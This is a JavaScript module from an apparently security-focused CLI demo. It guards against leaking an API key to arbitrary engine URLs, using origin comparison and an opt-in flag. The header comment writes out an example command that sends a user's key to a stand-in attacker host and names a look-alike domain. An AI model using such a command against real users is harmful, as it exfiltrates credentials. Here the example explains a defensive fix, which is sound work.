/**
 * engine-trust.mjs — decide whether this engine is allowed to see the API key.
 *
 * THE EXFILTRATION PRIMITIVE THIS REMOVES. `halRequestHeaders` attaches `REPID_API_KEY` as
 * a bearer token, and `--engine <url>` lets anyone retarget the CLI. Together that means
 *
 *     REPID_API_KEY=… npx @hyperdag/trust-demo --engine https://evil.example
 *
 * would hand the user's key to a stranger — a credential-exfiltration primitive shipped
 * inside a security demo, triggered by a command line that looks entirely reasonable
 * ("try it against my deployment"). Verified against a local hostile engine: before this
 * guard the token arrived in its logs; after it, zero Authorization headers.
 *
 * THE RULE. The token travels to the official origin only, unless the operator explicitly
 * says the custom host is theirs. Withholding is announced, never silent — a downgrade the
 * user cannot see is its own bug.
 *
 * Origin comparison, not prefix matching: `https://repid-engine-production.up.railway.app.evil.com`
 * passes `startsWith` and fails this.
 */

export const OFFICIAL_ORIGIN = 'https://repid-engine-production.up.railway.app';

/** @param {string} url @returns {string|null} */
export function originOf(url) {
  try { return new URL(url).origin; } catch { return null; }
}

/**
 * @param {string} engineUrl
 * @param {{optIn?: boolean, officialOrigin?: string}} [opts]
 * @returns {{allowed: boolean, origin: string|null, official: boolean, reason: string}}
 */
export function maySendKey(engineUrl, { optIn = false, officialOrigin = OFFICIAL_ORIGIN } = {}) {
  const origin = originOf(engineUrl);
  if (origin === null) {
    return { allowed: false, origin: null, official: false, reason: 'engine URL could not be parsed' };
  }
  const official = origin === officialOrigin;
  if (official) return { allowed: true, origin, official, reason: 'official engine origin' };
  if (optIn) return { allowed: true, origin, official, reason: 'operator opted in for a custom engine' };
  return { allowed: false, origin, official, reason: 'custom engine without --send-key-to-custom-engine' };
}
